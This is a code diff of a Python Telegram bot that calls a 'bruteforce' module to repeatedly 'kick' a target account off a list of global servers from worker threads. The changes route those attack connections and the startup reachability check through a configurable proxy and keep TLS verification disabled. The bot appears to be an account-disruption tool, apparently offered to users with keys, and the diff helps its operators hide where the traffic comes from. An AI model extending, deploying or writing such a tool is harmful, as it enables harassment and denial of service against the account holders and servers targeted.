@@ -11,7 +11,7 @@ telebot.apihelper.session.verify = False
 
 _BASEDIR = os.path.dirname(os.path.abspath(__file__))
 
-from config import BOT_TOKEN, ADMIN_IDS, KEYS_FILE, USERS_FILE
+from config import BOT_TOKEN, ADMIN_IDS, KEYS_FILE, USERS_FILE, PROXY_URL
 from bruteforce import tcp_kick_account, GLOBAL_SERVERS
 
 _KEYS_PATH = os.path.join(_BASEDIR, KEYS_FILE)
@@ -210,7 +210,7 @@ def cmd_on(message):
         while not c.is_set():
             host, port = GLOBAL_SERVERS[server_idx % len(GLOBAL_SERVERS)]
             try:
-                st, r = tcp_kick_account(did, host, port)
+                st, r = tcp_kick_account(did, host, port, proxy_url=PROXY_URL)
             except Exception as e:
                 print(f"[DEBUG] worker-{wid} EXCEPTION: {e}")
                 st, r = None, str(e)
@@ -496,15 +496,15 @@ if __name__ == '__main__':
     else:
         print(f"[DEBUG] Users file DOES NOT EXIST")
 
+    print(f"[DEBUG] Proxy: {PROXY_URL[:40]}..." if PROXY_URL else "[DEBUG] Proxy: NONE (direct connection)")
     print("[DEBUG] Checking server connectivity...")
     import socket as _sock
+    from bruteforce import http_connect_tunnel
     for _h, _p in GLOBAL_SERVERS:
         try:
-            _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
-            _s.settimeout(5)
-            _s.connect((_h, _p))
+            _s = http_connect_tunnel(PROXY_URL, _h, _p, timeout=5)
             _s.close()
-            print(f"[DEBUG] Server {_h}:{_p} => REACHABLE")
+            print(f"[DEBUG] Server {_h}:{_p} => REACHABLE (proxy={'yes' if PROXY_URL else 'no'})")
         except Exception as _e:
             print(f"[DEBUG] Server {_h}:{_p} => UNREACHABLE ({_e})")
 
